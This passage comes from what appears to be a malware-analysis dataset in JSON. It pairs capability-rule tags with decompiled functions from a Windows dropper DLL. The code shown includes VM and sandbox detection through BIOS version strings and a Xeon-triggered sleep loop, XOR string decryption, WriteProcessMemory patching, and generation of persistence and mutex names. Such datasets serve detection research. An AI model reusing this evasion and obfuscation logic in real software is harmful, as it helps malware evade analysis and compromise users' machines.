   var_1ch = 0x50756963;\n    var_18h._0_2_ = 0x6658;\n    var_18h._2_1_ = 0x45;\n    var_18h._3_1_ = 0x76;\n    var_14h._0_1_ = 0x6d;\n    var_14h._1_1_ = 0x6f;\n    var_14h._2_1_ = 0x75;\n    var_14h._3_1_ = 0x66;\n    var_8h = 0x45774b6c;\n    var_4h = 0x66455a54;\n    fcn.00401000(0x18);\n    iVar5 = var_58h;\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_58h;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_8h + uVar6) ^ puVar1[&var_28h - var_58h];\n    } while (uVar9 < 0x18);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0x122);\n    iVar5 = (*pcVar2)(0x427e10, iVar5);\n    if (iVar5 != 0) {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : SystemBiosVersion -> 55274-640-2673064-23950\", 0x124);\n        fcn.0040f0e5();\n    }\n    var_44h = 0x405a0240;\n    var_40h = 0x644f1e76;\n    var_3ch = 0x495d1943;\n    var_38h = 0x63490476;\n    var_34h = 0x4b5c1940;\n    var_30h = 0x50490274;\n    var_18h._0_2_ = 0x3477;\n    var_18h._2_1_ = 0x6e;\n    var_18h._3_1_ = 0x78;\n    var_14h._0_1_ = 0x41;\n    var_14h._1_1_ = 0x33;\n    var_14h._2_1_ = 0x79;\n    var_14h._3_1_ = 0x50;\n    fcn.00401000(0x18);\n    iVar5 = var_4h;\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_4h;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_18h + uVar6) ^ puVar1[&var_44h - var_4h];\n    } while (uVar9 < 0x18);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0x128);\n    iVar8 = (*pcVar2)(0x427e10, iVar5);\n    if (iVar8 != 0) {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : SystemBiosVersion -> 76487-644-3177037-23510\", 0x12a);\n        fcn.0040f0e5();\n    }\n    var_44h = 0xf677a04;\n    var_40h = 0x49507a66;\n    var_3ch = 0x36b6104;\n    var_38h = 0x4f5a6e63;\n    var_34h = 0x5616106;\n    var_30h = 0x7a576667;\n    var_18h._0_2_ = 0x4c33;\n    var_18h._2_1_ = 0x53;\n    var_18h._3_1_ = 0x37;\n    var_14h._0_1_ = 0x51;\n    var_14h._1_1_ = 0x57;\n    var_14h._2_1_ = 99;\n    var_14h._3_1_ = 0x7a;\n    fcn.00401000(0x18);\n    iVar8 = var_4h;\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_4h;\n        uVar6 = uVar9 & 0x80000007;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_18h + uVar6) ^ puVar1[&var_44h - var_4h];\n    } while (uVar9 < 0x18);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : decrypt (char) %s -> %s\", 0x12e);\n    iVar10 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x427e10, iVar8);\n    if (iVar10 != 0) {\n        fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectVM : SystemBiosVersion -> 76487-337-8429955-22614\", 0x130);\n        fcn.0040f0e5();\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    uVar7 = (*pcVar3)(0, iVar5);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_58h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_9ch);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_a0h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_60h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_ch);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_84h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_94h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_7ch);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_80h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_88h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_78h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_98h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_8ch);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_74h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_6ch);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_64h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_a8h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_b0h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_a4h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_ach);\n    uVar9 = (*pcVar2)(uVar7);\n    return uVar9 & 0xffffff00;\n}\n",
        "token_count": 9120
    },
    "0040964b": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040964b(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = 0;\n    arg_8h = arg_8h - in_EDX;\n    do {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(in_ECX, in_EDX, arg_8h + in_EDX, 1, 0);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = iVar2 + 1;\n        in_EDX = in_EDX + 1;\n    } while (iVar2 < 5);\n    return 1;\n}\n",
        "token_count": 175
    },
    "0040c548": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040c548(uchar *param_1)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int16_t *piVar10;\n    uchar *puVar11;\n    int32_t iVar12;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uchar *var_8h;\n    int16_t *var_4h;\n    \n    if (param_1 != NULL) {\n        puVar11 = param_1;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar11 = 0;\n            puVar11 = puVar11 + 1;\n        }\n        var_8h = param_1;\n        cVar3 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (cVar3 == '\\x05') {\n            var_24h = 0x6b045324;\n            var_20h = 0x6d41792a;\n            var_1ch = 0x6b0a5300;\n            var_18h = 0x6d50793e;\n            var_14h._0_2_ = 0x5377;\n            var_10h = 0x6b6b5377;\n            var_ch = 0x6d35794c;\n            fcn.00401000(0x24);\n            piVar10 = var_4h;\n            uVar8 = 0;\n            do {\n                puVar1 = uVar8 + var_4h;\n                uVar4 = uVar8 & 0x80000007;\n                if (uVar4 < 0) {\n                    uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                }\n                uVar8 = uVar8 + 1;\n                *puVar1 = *(&var_10h + uVar4) ^ puVar1[&var_24h - var_4h];\n            } while (uVar8 < 0x12);\n            fcn.00403bde(\"GTK DLL: regstor.cpp:%d > GenerateLocalStorageKey : decrypt (wide char) %s -> %ws\", 0xae);\n            piVar7 = piVar10;\n            do {\n                iVar2 = *piVar7;\n                *((param_1 - piVar10) + piVar7) = iVar2;\n                piVar7 = piVar7 + 1;\n            } while (iVar2 != 0);\n        }\n        else {\n            var_4ch = 0x57594b30;\n            var_48h = 0x633f3514;\n            var_44h = 0x7236363c;\n            var_40h = 0x4b064b47;\n            var_3ch = 0x3533576a;\n            var_38h = 0x363b633b;\n            var_34h = 0x4b547213;\n            var_30h = 0x57574b17;\n            var_2ch = 0x6324353e;\n            var_28h = 0x7257363c;\n            var_10h = 0x57364b63;\n            var_ch = CONCAT13(var_ch._3_1_, 0x4b3572);\n            fcn.00401000(0x50);\n            piVar10 = var_4h;\n            iVar12 = 0;\n            iVar6 = &var_4ch - var_4h;\n            do {\n                var_4h = 0x7;\n                puVar1 = iVar12 + piVar10;\n                iVar9 = iVar12 % 7;\n                iVar12 = iVar12 + 1;\n                *puVar1 = *(&var_10h + iVar9) ^ puVar1[iVar6];\n            } while (iVar12 < 0x28);\n            fcn.00403bde(\"GTK DLL: regstor.cpp:%d > GenerateLocalStorageKey : decrypt (wide char) %s -> %ws\", 0xb2);\n            piVar7 = piVar10;\n            do {\n                iVar2 = *piVar7;\n                *((var_8h - piVar10) + piVar7) = iVar2;\n                piVar7 = piVar7 + 1;\n            } while (iVar2 != 0);\n        }\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar10);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return;\n}\n",
        "token_count": 1179
    },
    "004047ce": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004047ce(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    puVar9 = &var_1ch;\n    for (iVar7 = 8; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_28h = 0x2853015c;\n    var_24h = 0x250b1e29;\n    var_20h = CONCAT22(var_20h._2_2_, 0x755e);\n    var_14h = 0x44377532;\n    var_10h = 0x496f3045;\n    fcn.00401000(10);\n    iVar7 = var_8h;\n    uVar8 = 0;\n    do {\n        puVar1 = uVar8 + var_8h;\n        uVar4 = uVar8 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar8 = uVar8 + 1;\n        *puVar1 = *(&var_14h + uVar4) ^ puVar1[&var_28h - var_8h];\n    } while (uVar8 < 10);\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GetLocalSaveBodyFileHash : decrypt (char) %s -> %s\", 0x52);\n    var_2ch = 0xc263d34;\n    var_28h = 0x1a0a5537;\n    var_24h = 0x3d092c12;\n    var_20h = 0x6f480b3b;\n    var_14h = 0x4f4a4966;\n    var_10h = 0x6f7a3858;\n    fcn.00401000(0x10);\n    uVar8 = 0;\n    do {\n        puVar1 = uVar8 + var_8h;\n        uVar4 = uVar8 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar8 = uVar8 + 1;\n        *puVar1 = *(&var_14h + uVar4) ^ puVar1[&var_2ch - var_8h];\n    } while (uVar8 < 0x10);\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GetLocalSaveBodyFileHash : decrypt (char) %s -> %s\", 0x53);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar7, var_8h);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n    cVar3 = fcn.0040ca70();\n    if (cVar3 != '\\0') {\n        var_4h = (*pcVar6)(0, var_18h, var_1ch);\n    }\n    fcn.0040cff1();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar7);\n    (*pcVar6)(uVar5);\n    return var_4h;\n}\n",
        "token_count": 994
    },
    "00404bcc": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00404bcc(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint noname_0;\n    uint noname_0_00;\n    code *pcVar7;\n    code *pcVar8;\n    uint noname_0_01;\n    char *lpString;\n    uint uVar9;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = *0x427ccc;\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : [ENTERED]\", 0xc3);\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : Generating machine-level names from seed 0x%08x\"\n                 , 0xc4);\n    pcVar7 = _sym.imp.ntdll.dll_RtlRandom;\n    (*_sym.imp.ntdll.dll_RtlRandom)(0x427ccc);\n    uVar2 = (*pcVar7)(0x427ccc);\n    iVar3 = fcn.00404921(uVar2 & 0xff, 0x427ccc, 0x427d24, &var_8h);\n    if (iVar3 == 0) {\n        uVar9 = 0xd6;\n        lpString = \"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : Failed generating main module name.\";\n    }\n    else {\n        iVar3 = fcn.00404921(0, 0x427ccc, 0x427d28, &var_8h);\n        if (iVar3 != 0) {\n            fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : g_ClientFileName %ws\", 0xdf);\n            var_24h = 0x6e125442;\n            var_20h = 0x4a144f3f;\n            var_1ch._0_2_ = 0x546c;\n            var_18h = 0x6e77546c;\n            var_14h = 0x4a714f47;\n            fcn.00401000(0x14);\n            iVar3 = var_10h;\n            uVar2 = 0;\n            do {\n                puVar1 = uVar2 + var_10h;\n                uVar4 = uVar2 & 0x80000007;\n                if (uVar4 < 0) {\n                    uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                }\n                uVar2 = uVar2 + 1;\n                *puVar1 = *(&var_18h + uVar4) ^ puVar1[&var_24h - var_10h];\n            } while (uVar2 < 10);\n            fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : decrypt (wide char) %s -> %ws\", 0xe2);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x427d28, iVar3);\n            iVar5 = fcn.00404921(0, 0x427ccc, 0x427d20, &var_8h);\n            if (iVar5 == 0) {\n                fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : Failed generating main module name.\"\n                             , 0xeb);\n            }\n            else {\n                var_14h = fcn.0040a17f(noname_0, 0);\n                if (var_14h != 0) {\n                    var_4h = var_4h ^ 0x29787279;\n                    var_34h = 0x41597235;\n                    var_30h = 0x542a6e26;\n                    var_2ch = 0x416a7215;\n                    var_28h._0_2_ = 0x6e45;\n                    var_24h = 0x41367279;\n                    var_20h = 0x544b6e45;\n                    fcn.00401000(0x1c);\n                    iVar5 = var_10h;\n                    uVar2 = 0;\n                    do {\n                        puVar1 = uVar2 + var_10h;\n                        uVar4 = uVar2 & 0x80000007;\n                        if (uVar4 < 0) {\n                            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                        }\n                        uVar2 = uVar2 + 1;\n                        *puVar1 = *(&var_24h + uVar4) ^ puVar1[&var_34h - var_10h];\n                    } while (uVar2 < 0xe);\n                    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : decrypt (wide char) %s -> %ws\", \n                                 0xf6);\n                    uVar9 = 1;\n                    *0x427d1c = fcn.0040a17f(noname_0_00, 1);\n                    if (*0x427d1c == 0) {\ncode_r0x00404e04:\n                        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n                    }\n                    else {\n                        noname_0_01 = 1;\n                        var_10h = fcn.0040a17f(uVar9, 1);\n                        if (var_10h == 0) goto code_r0x00404e04;\n                        *0x427d18 = fcn.0040a17f(noname_0_01, 1);\n                        if (*0x427d18 != 0) {\n                            var_4h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                            iVar6 = fcn.00404921(0, &var_4h, 0x427d14, &var_8h);\n                            if (iVar6 == 0) {\n                                fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : Failed generating client dll export name.\"\n                                             , 0x107);\n                            }\n                            else {\n                                fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : 32-bit startup value name is %ws\"\n                                             , 0x10b);\n                                fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : 32-bit client dll module name is %ws\"\n                                             , 0x10c);\n                                fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : 64-bit startup value name is %ws\"\n                                             , 0x10d);\n                                fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : Update event name is %ws\"\n                                             , 0x10e);\n                                fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : Config update mutex name is %ws\"\n                                             , 0x10f);\n                                fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : Config update timer name is %ws\"\n                                             , 0x110);\n                                var_ch = 1;\n                            }\n                        }\n                        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n                        uVar9 = (*pcVar8)(0, iVar3);\n                        (*pcVar7)(uVar9);\n                        iVar3 = var_10h;\n                    }\n                    uVar9 = (*pcVar8)(0, iVar3);\n                    (*pcVar7)(uVar9);\n                    uVar9 = (*pcVar8)(0, var_14h);\n                    (*pcVar7)(uVar9);\n                    goto code_r0x00404f43;\n                }\n            }\n            uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n            goto code_r0x00404f43;\n        }\n        uVar9 = 0xdc;\n        lpString = \"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : Failed generating client dll module name.\";\n    }\n    fcn.00403bde(lpString, uVar9);\ncode_r0x00404f43:\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > GenMachineLevelNames : [LEAVED]\", 0x11b);\n    return var_ch;\n}\n",
        "token_count": 2148
    },
    "0040508e": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040508e(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uchar *puVar11;\n    uint8_t auStackY2512 [1072];\n    int16_t iVar12;\n    uint uStack1328;\n    int32_t iStack1324;\n    uint uStack1320;\n    uint uStack1316;\n    ushort uStack1312;\n    uchar uStack1310;\n    uchar uStack1309;\n    uchar uStack1308;\n    ushort uStack1307;\n    uchar uStack1305;\n    int32_t iStack1304;\n    uint uStack1300;\n    uint uStack1296;\n    uint8_t auStack1280 [4];\n    uint uStack1276;\n    uint uStack1272;\n    uint uStack1268;\n    uint uStack1264;\n    uint uStack1260;\n    uint uStack1256;\n    uint uStack1252;\n    ushort uStack1248;\n    uchar uStack1246;\n    uint uStack1245;\n    uint uStack1241;\n    uint uStack1237;\n    uint uStack1233;\n    uint uStack1229;\n    uint uStack1225;\n    uint uStack1221;\n    uint uStack1217;\n    uint uStack1213;\n    ushort uStack1209;\n    uchar uStack1207;\n    uchar uStack1206;\n    uint uStack1205;\n    uint uStack1201;\n    uint uStack1197;\n    uint uStack1193;\n    uint uStack1189;\n    ushort uStack1185;\n    uchar uStack1183;\n    uint8_t auStack1176 [4];\n    uint32_t uStack1172;\n    int32_t iStack1168;\n    uint uStack1156;\n    int32_t iStack1152;\n    uint uStack1140;\n    uchar auStack1136 [16];\n    uchar auStack1120 [12];\n    uchar auStack1108 [4];\n    int16_t iStack1104;\n    uchar auStack1102 [34];\n    uchar auStack1068 [36];\n    uchar auStack1032 [1028];\n    \n    fcn.00403bde(0x413c70, 0x13f);\n    uStack1140 = 0x200;\n    uStack1320 = 0x2d21162d;\n    uStack1316 = 0x744b050a;\n    puVar11 = auStack1032;\n    for (iVar7 = 0x400; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    uStack1312 = 0x375d;\n    uStack1310 = 0x2f;\n    uStack1309 = 3;\n    puVar11 = auStack1136;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    uStack1308 = 0x69;\n    puVar11 = auStack1068;\n    for (iVar7 = 0x24; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    uStack1328 = CONCAT13(uStack1328._3_1_, 0x78696f);\n    fcn.00401000(0xd);\n    uStack1300 = 7;\n    iStack1304 = 0;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iStack1152;\n        iVar9 = iVar7 % 7;\n        iVar7 = iVar7 + 1;\n        *puVar1 = (&stack0xfffffac8)[iVar9] ^ puVar1[&iStack1324 - iStack1152];\n    } while (iVar7 < 0xd);\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > MemoryDetectionRoutine : decrypt (char) %s -> %s\", 0x14c);\n    iStack1324 = 0x2c171d73;\n    uStack1320 = 0x1a034051;\n    uStack1316 = 0x111a2b51;\n    uStack1312 = 0x5144;\n    uStack1310 = 7;\n    uStack1309 = 0x25;\n    uStack1308 = 0x5a;\n    uStack1307 = 0xc1e;\n    uStack1305 = 0x62;\n    fcn.00401000(0x14);\n    uVar10 = 0;\n    do {\n        puVar1 = uVar10 + iStack1304;\n        uVar4 = uVar10 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar10 = uVar10 + 1;\n        *puVar1 = (&stack0xfffffac4)[uVar4] ^ puVar1[&uStack1328 - iStack1304];\n    } while (uVar10 < 0x14);\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > MemoryDetectionRoutine : decrypt (char) %s -> %s\", 0x14d);\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > MemoryDetectionRoutine : pGetNativeSystemInfo : %p\", 0x152);\n    uStack1156 = 0x40;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)();\n    iVar12 = *0x10 + -0x444;\n    if (pcVar5 == NULL) {\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)();\n    }\n    else {\n        (*pcVar5)();\n    }\n    iVar7 = 0xbc;\n    uStack1276 = 0x6d0c5031;\n    uStack1272 = 0x7933341e;\n    uStack1268 = 0x6d0c500e;\n    uStack1264 = 0x7932341e;\n    uStack1260 = 0x6d295025;\n    uStack1256 = 0x79043429;\n    uStack1252 = 0x6d3f503a;\n    uStack1248 = 0x3425;\n    uStack1246 = 7;\n    uStack1245 = 0x24502d79;\n    uStack1241 = 0x1934236d;\n    uStack1237 = 0x3e502579;\n    uStack1233 = 0x2434156d;\n    uStack1229 = 0x8500d79;\n    uStack1225 = 0xb34016d;\n    uStack1221 = 0x8503a79;\n    uStack1217 = 0x2334026d;\n    uStack1213 = 0xc500b79;\n    uStack1209 = 0x6d;\n    uStack1207 = 0x34;\n    uStack1205 = 0x2500b79;\n    uStack1201 = 0x32340f6d;\n    uStack1197 = 0x1e500a79;\n    uStack1193 = 0x2534036d;\n    uStack1189 = 0x5d502579;\n    uStack1185 = 0x6c6d;\n    uStack1183 = 0x34;\n    uStack1206 = uStack1246;\n    fcn.00401000(0xbc);\n    uVar10 = 0;\n    do {\n        puVar1 = uVar10 + iStack1324;\n        uVar4 = uVar10 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar10 = uVar10 + 1;\n        *puVar1 = (&stack0xfffffaac)[uVar4] ^ puVar1[auStack1280 + -iStack1324];\n    } while (uVar10 < 0x5e);\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > MemoryDetectionRoutine : decrypt (wide char) %s -> %ws\", 0x162);\n    iVar9 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)();\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (iVar9 == 0) {\n        uStack1328 = 0x39027618;\n        iStack1324 = 0x4b104837;\n        uStack1320 = 0x390e7604;\n        uStack1316 = 0x4b2d4820;\n        uStack1312 = 0x7616;\n        uStack1310 = 0xc;\n        uStack1309 = 0x39;\n        uStack1308 = 0x37;\n        uStack1307 = 0x3048;\n        uStack1305 = 0x4b;\n        iStack1304 = 0x39137603;\n        uStack1300 = 0x4b0d483b;\n        uStack1296 = 0x39617610;\n        fcn.00401000(0x50);\n        uVar10 = 0;\n        do {\n            puVar1 = auStack1176 + uVar10;\n            uVar4 = uVar10 & 0x80000007;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n            }\n            uVar10 = uVar10 + 1;\n            *puVar1 = (&stack0xfffffaa8)[uVar4] ^ puVar1[&stack0xfffffac8 + -auStack1176];\n        } while (uVar10 < 0x28);\n        fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > MemoryDetectionRoutine : decrypt (wide char) %s -> %ws\", 0x165);\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(CONCAT13(uStack1189, uStack1193._1_3_), auStack1176);\n        fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > MemoryDetectionRoutine : ProcessorNameBuffer : %ws\", 0x168);\n        piVar8 = &iStack1104;\n        do {\n            iVar2 = *piVar8;\n            piVar8 = piVar8 + 1;\n        } while (iVar2 != iVar12);\n        if (piVar8 - auStack1102 >> 1 != 0) {\n            fcn.00401000(0x14);\n            uVar10 = 0;\n            do {\n                puVar1 = uVar10 + iVar7;\n                uVar4 = uVar10 & 0x80000007;\n                if (uVar4 < 0) {\n                    uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                }\n                uVar10 = uVar10 + 1;\n                *puVar1 = (&stack0xfffffa8c)[uVar4] ^ puVar1[&stack0xfffffa80 + -iVar7];\n            } while (uVar10 < 10);\n            fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > MemoryDetectionRoutine : decrypt (wide char) %s -> %ws\", 0x16b);\n            iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(auStack1108, iVar7);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            while (iVar9 != 0) {\n                fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > MemoryDetectionRoutine : Xeon detected, wait...\", 0x16e);\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n                iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(auStack1120, iVar7);\n            }\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n            (*pcVar5)(uVar6);\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(CONCAT13(uStack1213, uStack1217._1_3_));\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, auStack1176);\n        